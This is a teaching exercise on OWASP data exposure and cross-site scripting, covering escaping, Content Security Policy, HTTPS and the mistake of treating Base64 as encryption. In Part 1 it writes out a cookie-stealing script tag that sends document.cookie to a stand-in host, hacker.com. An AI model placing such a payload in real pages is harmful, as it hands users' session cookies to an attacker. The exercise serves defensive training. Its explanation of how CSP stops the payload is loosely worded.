# Exercise 004 - OWASP Top 10 Part 2: Data Exposure & XSS

### Objective
Secure the browser and the wire. Master the second half of the **OWASP Top 10**. Focus on #3: **Cryptographic Failures** (Sensitive Data Exposure) and #7: **Cross-Site Scripting (XSS)**. Learn how a hacker can "Steal a session cookie" just by posting a comment on your blog, and how to verify your encryption logic.

### Core Concepts to Master
- **Sensitive Data Exposure:** Storing passwords in plain text, sending credit cards over HTTP (not HTTPS), or putting PII in long-term logs.
- **XSS (Cross-Site Scripting):** An attacker injects a malicious `<script>` tag into your page. This script runs on the browser of *every other user* who visits the page.
- **Stored XSS:** The script is saved in the database (e.g., in a comment).
- **Reflected XSS:** The script is in the URL and "Reflected" on the page (e.g., `?search=<script>...`).
- **Content Security Policy (CSP):** A set of headers that tell the browser "Only run scripts from my own domain."
- **Sanitization:** Stripping out `<script>` tags from all incoming HTML.

### Research Topics
- "How XSS (Cross-Site Scripting) works"
- "Stealing cookies using XSS: A tutorial"
- "Preventing XSS in React vs Vanilla JS"
- "Configuring Content-Security-Policy (CSP) headers"

---

### The Practical Challenge

**Part 1: The Mallicious Comment (XSS)**
1. You have a blog. In the "Comment" box, a hacker types:
   - `<script>fetch('https://hacker.com/steal?cookie=' + document.cookie)</script>`.
2. Every user who reads that comment will have their login cookie sent to the hacker!
3. Discuss: How does a **Content Security Policy (CSP)** that says `script-src 'self'` stop this attack? (Answer: The browser will refuse to talk to `hacker.com`).

**Part 2: The "HTML Escape" Fix**
1. Research how modern frameworks (like React) automatically "Escape" HTML characters:
   - `<` becomes `&lt;`. 
2. Discuss: If the browser sees `&lt;script&gt;`, will it run the code? (Answer: No, it just shows it as text).

**Part 3: The Cryptographic Fail (Data Exposure)**
1. Research why using **Base64** to "Encrypt" a user's password is a failure. 
2. (Answer: Base64 is NOT encryption; it's just encoding. Anyone can decode it in 1 second).

**Part 4: Identifying the exposure**
1. Research **HTTPS** (TLS). 
2. Discuss why sending a login form over plain "HTTP" is a "Sensitive Data Exposure" vulnerability. (Answer: Anyone on the same public Wi-Fi can see the password).

---

### Common Gotchas & Troubleshooting
- **Gotcha 1:** `dangerouslySetInnerHTML` in React. This "bypasses" all built-in security. If you use it with user-provided data, you ARE vulnerable to XSS.
- **Gotcha 2:** Only encrypting data "at rest." If you encrypt the database but send the "Keys" in a plain text configuration file on the same server, you haven't secured anything!

### Reflection Question
Why is XSS considered a "Client-side" attack, and why is it many times more dangerous than a simple server-side crash? (Answer: Because it allows a hacker to "be" the user in their own browser).
